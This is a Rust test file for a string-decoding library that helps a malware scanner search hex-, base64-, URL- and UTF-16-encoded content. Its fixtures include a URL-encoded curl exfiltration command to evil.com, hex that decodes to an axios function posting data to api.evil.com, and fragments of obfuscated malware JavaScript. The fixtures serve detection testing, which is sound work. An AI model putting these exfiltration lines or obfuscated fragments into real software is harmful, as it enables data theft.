//! Tests for text file encoding detection and decoding.
//!
//! Ensures that text files with encoded content (hex, base64, URL-encoding, etc.)
//! are properly decoded and made searchable for API consumers like DISSECT.

use stng::{ExtractOptions, StringKind, StringMethod};

#[test]
fn test_text_file_hex_decoding() {
    // Hex-encoded JavaScript malware (common in npm packages)
    let hex_content = "636F6E7374205F30783163313030303D5F3078323330643B66756E6374696F6E205F307832333064285F30783939366132322C5F3078353839613536297B636F6E7374205F30783131303533613D5F30783131303528293B72657475726E205F3078323330643D66756E6374696F6E";

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(hex_content.as_bytes(), &opts);

    // Should have at least one string (the decoded version)
    assert!(
        !strings.is_empty(),
        "Should extract decoded string from hex"
    );

    // Find the decoded string
    let decoded = strings.iter().find(|s| s.method == StringMethod::HexDecode);
    assert!(decoded.is_some(), "Should have HexDecode method string");

    let decoded = decoded.unwrap();
    assert!(
        decoded.value.contains("const"),
        "Decoded should contain JavaScript"
    );
    assert!(
        decoded.value.contains("function"),
        "Decoded should contain function keyword"
    );
    assert!(
        decoded.value.contains("_0x"),
        "Decoded should contain obfuscated identifiers"
    );

    // Verify it's classified correctly (not as HexEncoded, but as decoded content)
    // The kind should be based on the decoded content, not the encoding
    assert_ne!(
        decoded.kind,
        StringKind::HexEncoded,
        "Decoded string should not be marked as HexEncoded"
    );
}

#[test]
fn test_text_file_base64_decoding() {
    // Base64-encoded secret
    let base64_content = "c2VjcmV0X2FwaV9rZXlfMTIzNDU2Nzg5MA=="; // "secret_api_key_1234567890"

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(base64_content.as_bytes(), &opts);

    assert!(
        !strings.is_empty(),
        "Should extract decoded string from base64"
    );

    // Find the decoded string
    let decoded = strings
        .iter()
        .find(|s| s.method == StringMethod::Base64Decode);
    assert!(decoded.is_some(), "Should have Base64Decode method string");

    let decoded = decoded.unwrap();
    assert_eq!(
        decoded.value, "secret_api_key_1234567890",
        "Should decode base64 correctly"
    );
}

#[test]
fn test_text_file_url_decoding() {
    // URL-encoded command injection
    let url_content = "curl%20-X%20POST%20https%3A%2F%2Fevil.com%2Fexfil";

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(url_content.as_bytes(), &opts);

    assert!(
        !strings.is_empty(),
        "Should extract decoded string from URL encoding"
    );

    // Find the decoded string
    let decoded = strings.iter().find(|s| s.method == StringMethod::UrlDecode);
    assert!(decoded.is_some(), "Should have UrlDecode method string");

    let decoded = decoded.unwrap();
    assert!(decoded.value.contains("curl"), "Should decode URL encoding");
    assert!(
        decoded.value.contains("https://evil.com"),
        "Should decode URL correctly"
    );
}

#[test]
fn test_text_file_unicode_escape_decoding() {
    // Unicode escape sequences (common in JavaScript obfuscation)
    let unicode_content = r"\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64"; // "Hello World"

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(unicode_content.as_bytes(), &opts);

    assert!(
        !strings.is_empty(),
        "Should extract decoded string from unicode escapes"
    );

    // Find the decoded string
    let decoded = strings
        .iter()
        .find(|s| s.method == StringMethod::UnicodeEscapeDecode);
    assert!(
        decoded.is_some(),
        "Should have UnicodeEscapeDecode method string"
    );

    let decoded = decoded.unwrap();
    assert_eq!(
        decoded.value, "Hello World",
        "Should decode unicode escapes"
    );
}

#[test]
fn test_dissect_api_gets_decoded_content() {
    // Simulate what DISSECT receives when analyzing a text file with hex-encoded malware
    let malware_content = "636F6E73742073656372657420"; // "const secret"

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(malware_content.as_bytes(), &opts);

    // DISSECT should be able to search the decoded content
    let can_search_const = strings.iter().any(|s| s.value.contains("const"));
    let can_search_secret = strings.iter().any(|s| s.value.contains("secret"));

    assert!(
        can_search_const,
        "DISSECT should be able to search for 'const' in decoded content"
    );
    assert!(
        can_search_secret,
        "DISSECT should be able to search for 'secret' in decoded content"
    );
}

#[test]
fn test_library_deduplicates_keeps_decoded() {
    // When both encoded and decoded versions exist at same offset,
    // library should keep the decoded version (higher priority)
    let hex_content = "48656C6C6F20576F726C6421"; // "Hello World!" (12 bytes, 24 hex chars)

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(hex_content.as_bytes(), &opts);

    // Should have at least one string (deduplication keeps the best one)
    assert!(
        !strings.is_empty(),
        "Should have strings after deduplication"
    );

    // The string we get should be the decoded version, not the hex-encoded original
    let has_decoded = strings.iter().any(|s| s.method == StringMethod::HexDecode);
    assert!(
        has_decoded,
        "Should keep decoded version after deduplication"
    );

    // Verify we can find the decoded content
    let has_hello = strings.iter().any(|s| s.value.contains("Hello"));
    assert!(has_hello, "Should be able to find decoded 'Hello'");
}

#[test]
fn test_multiline_hex_in_text_file() {
    // Text file with multiple lines of hex-encoded content (both > 16 chars)
    let content = "636F6E7374206170693D2768747470733A2F2F6170692E6578616D706C652E636F6D273B\n\
                   636F6E7374207365637265743D27746F6B656E313233343536373839273B";
    // Line 1: "const api='https://api.example.com';" (40 bytes, 80 hex chars)
    // Line 2: "const secret='token1234567890';" (34 bytes, 68 hex chars)

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(content.as_bytes(), &opts);

    // Should decode both lines
    let decoded_strings: Vec<_> = strings
        .iter()
        .filter(|s| s.method == StringMethod::HexDecode)
        .collect();

    assert!(
        !decoded_strings.is_empty(),
        "Should decode hex strings from text file"
    );

    // Should be able to search for content from decoded lines
    let has_api = strings.iter().any(|s| s.value.contains("api.example.com"));
    let has_secret = strings.iter().any(|s| s.value.contains("token"));

    assert!(
        has_api || has_secret,
        "Should decode at least one line of hex content"
    );
}

#[test]
fn test_mixed_encodings_in_text_file() {
    // Text file with multiple encoding types (all meeting minimum lengths)
    let content = "48656C6C6F20576F726C6421204865726520697320736F6D65206D6F726520746578742E\n\
                   SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBiYXNlNjQgc3RyaW5nLg==\n\
                   Hello%20World%21%20This%20is%20URL%20encoded.";
    // Line 1: hex "Hello World! Here is some more text." (36 bytes, 72 hex chars)
    // Line 2: base64 "Hello World! This is a base64 string." (38 bytes)
    // Line 3: URL-encoded "Hello World! This is URL encoded."

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(content.as_bytes(), &opts);

    // Should have decoded strings from multiple encoding types
    let has_hex_decode = strings.iter().any(|s| s.method == StringMethod::HexDecode);
    let has_base64_decode = strings
        .iter()
        .any(|s| s.method == StringMethod::Base64Decode);
    let has_url_decode = strings.iter().any(|s| s.method == StringMethod::UrlDecode);

    // At least some of these should be decoded
    assert!(
        has_hex_decode || has_base64_decode || has_url_decode,
        "Should decode at least one encoding type from mixed content"
    );
}

#[test]
fn test_real_world_woff2_malware() {
    // Simulate the real file from the issue: .woff2 file with embedded hex-encoded JS
    let hex_js = "636F6E7374205F30783163313030303D5F3078323330643B66756E6374696F6E205F307832333064285F30783939366132322C5F3078353839613536297B636F6E7374205F30783131303533613D5F30783131303528293B72657475726E205F3078323330643D66756E6374696F6E285F30783233306434612C5F3078313737373530297B5F30783233306434613D5F30783233306434612D30783136323B6C6574205F30783235303861353D5F30783131303533615B5F30783233306434615D3B";

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(hex_js.as_bytes(), &opts);

    // Should decode the hex-encoded JavaScript
    let decoded_js = strings
        .iter()
        .find(|s| s.method == StringMethod::HexDecode && s.value.contains("function"));

    assert!(
        decoded_js.is_some(),
        "Should decode hex-encoded JavaScript from woff2 file"
    );

    let decoded = decoded_js.unwrap();

    // Verify we can search for malware indicators
    assert!(
        decoded.value.contains("const"),
        "Should find 'const' in decoded JS"
    );
    assert!(
        decoded.value.contains("function"),
        "Should find 'function' in decoded JS"
    );
    assert!(
        decoded.value.contains("_0x"),
        "Should find obfuscated identifiers"
    );
}

#[test]
fn test_json_output_consistency_with_cli() {
    // Ensure that what users see in CLI matches what's in JSON output
    // (both should show decoded content)
    let hex_content = "636F6E73742073656372657420"; // "const secret"

    let opts = ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(hex_content.as_bytes(), &opts);

    // JSON output (via library) should include decoded content
    let has_decoded = strings
        .iter()
        .any(|s| s.method == StringMethod::HexDecode && s.value.contains("secret"));

    assert!(
        has_decoded,
        "JSON output should include decoded content just like CLI shows it"
    );
}

#[test]
fn test_dissect_api_consumer_workflow() {
    // Simulate how DISSECT (and other API consumers) use stng to extract and search strings
    let malware_hex = "636F6E7374207365637265743D2768747470733A2F2F6170692E6576696C2E636F6D2F6578\
                       66696C273B0A636F6E7374206B65793D2761626364313233273B0A66756E6374696F6E206578\
                       66696C286461746129207B72657475726E206178696F732E706F7374287365637265742C6461\
                       7461293B7D";
    // Decodes to:
    // const secret='https://api.evil.com/exfil';
    // const key='abcd123';
    // function exfil(data) {return axios.post(secret,data);}

    // API consumers call extract_strings_with_options
    let opts = stng::ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(malware_hex.as_bytes(), &opts);

    // They should be able to search decoded content for malware indicators
    assert!(
        strings.iter().any(|s| s.value.contains("evil.com")),
        "Should find malicious domain in decoded content"
    );

    assert!(
        strings.iter().any(|s| s.value.contains("axios")),
        "Should find HTTP library usage"
    );

    assert!(
        strings.iter().any(|s| s.value.contains("exfil")),
        "Should find exfiltration function name"
    );

    // Verify they get decoded entries, not just detection
    let decoded_count = strings
        .iter()
        .filter(|s| s.method == StringMethod::HexDecode)
        .count();
    assert!(
        decoded_count > 0,
        "Should have HexDecode method entries for API consumers"
    );
}

#[test]
fn test_utf16le_bom_javascript_malware() {
    // Real-world UTF-16LE encoded JavaScript malware sample (79197527.js)
    // This file starts with UTF-16LE BOM (0xFF 0xFE) and contains obfuscated JavaScript
    // that creates files, executes wscript.exe, and runs PowerShell commands

    // First few lines of the malware encoded as UTF-16LE with BOM
    let utf16le_js = b"\xFF\xFE\
\r\x00\n\x00 \x00 \x00\r\x00\n\x00f\x00u\x00n\x00c\x00t\x00i\x00o\x00n\x00 \x00\
v\x00f\x00v\x00t\x00w\x00(\x00 \x00u\x00f\x00z\x00m\x00u\x00,\x00 \x00B\x00h\x00\
u\x00Q\x00T\x00 \x00)\x00 \x00{\x00\r\x00\n\x00 \x00 \x00v\x00a\x00r\x00 \x00\
F\x00a\x00g\x00d\x00C\x00 \x00=\x00 \x00(\x00\"\x00\\\xAA\xDA\x02\xFD\xFF\
\xDA\x02.\x00\xFD\xFF \x00\xBC\x05 \x00\xFD\xFF\xFD\xFF.\x00 \x00\x00%\xCE\t\
\xFD\xFF \x00 \x00\xFD\xFF\x00%\xFD\xFF\xFD\xFF \x00.\x00\xFD\xFF\xFD\xFF.'%\x00\
%\x00\x0C\xD8\x9D\xDD\x00% \x00\x01\xD8\"\xDD.\x00\x0C\xD8\xD3\xDD\x00%\x00\
% \x00\x00%\xDA\x02\xFD\xFF \x00 \x00\xFD\xFF\xD9\x02\xFD\xFF\x00%\"\x00 \x00\
+\x00 \x00\"\x00>\x04=\x042\x040\x04A\x04\"\x00)\x00 \x00 \x00;\x00\r\x00\n\x00";

    let opts = stng::ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(utf16le_js, &opts);

    // Should detect UTF-16LE BOM and decode the file
    assert!(
        !strings.is_empty(),
        "Should extract strings from UTF-16LE encoded file"
    );

    // All strings should be marked as Utf16LeDecode
    let utf16_decoded = strings
        .iter()
        .filter(|s| s.method == StringMethod::Utf16LeDecode)
        .count();
    assert!(
        utf16_decoded > 0,
        "Should have Utf16LeDecode method strings"
    );

    // Should extract JavaScript function names and keywords
    assert!(
        strings.iter().any(|s| s.value.contains("function")),
        "Should extract 'function' keyword"
    );
    assert!(
        strings.iter().any(|s| s.value.contains("vfvtw")),
        "Should extract function name 'vfvtw'"
    );
    assert!(
        strings.iter().any(|s| s.value.contains("var")),
        "Should extract 'var' keyword"
    );
    assert!(
        strings.iter().any(|s| s.value.contains("FagdC")),
        "Should extract variable name 'FagdC'"
    );
}

#[test]
fn test_utf16be_bom_detection() {
    // UTF-16BE BOM (0xFE 0xFF) followed by "Hello World"
    let utf16be_data = b"\xFE\xFF\
\x00H\x00e\x00l\x00l\x00o\x00 \x00W\x00o\x00r\x00l\x00d";

    let opts = stng::ExtractOptions::new(4);
    let strings = stng::extract_strings_with_options(utf16be_data, &opts);

    assert!(
        !strings.is_empty(),
        "Should extract strings from UTF-16BE encoded file"
    );

    // Should be marked as Utf16BeDecode
    let utf16_decoded = strings
        .iter()
        .filter(|s| s.method == StringMethod::Utf16BeDecode)
        .count();
    assert!(
        utf16_decoded > 0,
        "Should have Utf16BeDecode method strings"
    );

    // Should decode "Hello World"
    assert!(
        strings.iter().any(|s| s.value.contains("Hello")),
        "Should decode UTF-16BE content"
    );
}

#[test]
fn test_dissect_vs_bare_options() {
    let data = std::fs::read("/Users/t/data/dissect/malware/typescript/2026.property-demo/webfonts/fa-brands-regular.woff2").unwrap();

    // Test 1: bare options like the unit test
    let opts1 = stng::ExtractOptions::new(4);
    let strings1 = stng::extract_strings_with_options(&data, &opts1);
    eprintln!("Bare options: {} strings", strings1.len());
    for (i, s) in strings1.iter().take(3).enumerate() {
        eprintln!(
            "  bare[{}]: method={:?}, preview={}",
            i,
            s.method,
            s.value.chars().take(60).collect::<String>()
        );
    }

    // Test 2: DISSECT options
    let opts2 = stng::ExtractOptions::new(4)
        .with_garbage_filter(true)
        .with_xor(None);
    let strings2 = stng::extract_strings_with_options(&data, &opts2);
    eprintln!(
        "\nDISSECT options (garbage_filter=true, xor=None): {} strings",
        strings2.len()
    );
    for (i, s) in strings2.iter().take(3).enumerate() {
        eprintln!(
            "  dissect[{}]: method={:?}, preview={}",
            i,
            s.method,
            s.value.chars().take(60).collect::<String>()
        );
    }

    // They should both find the decoded JavaScript
    assert!(
        strings1
            .iter()
            .any(|s| s.method == stng::StringMethod::HexDecode && s.value.contains("function")),
        "Bare options should decode hex"
    );
    assert!(
        strings2
            .iter()
            .any(|s| s.method == stng::StringMethod::HexDecode && s.value.contains("function")),
        "DISSECT options should also decode hex"
    );
}
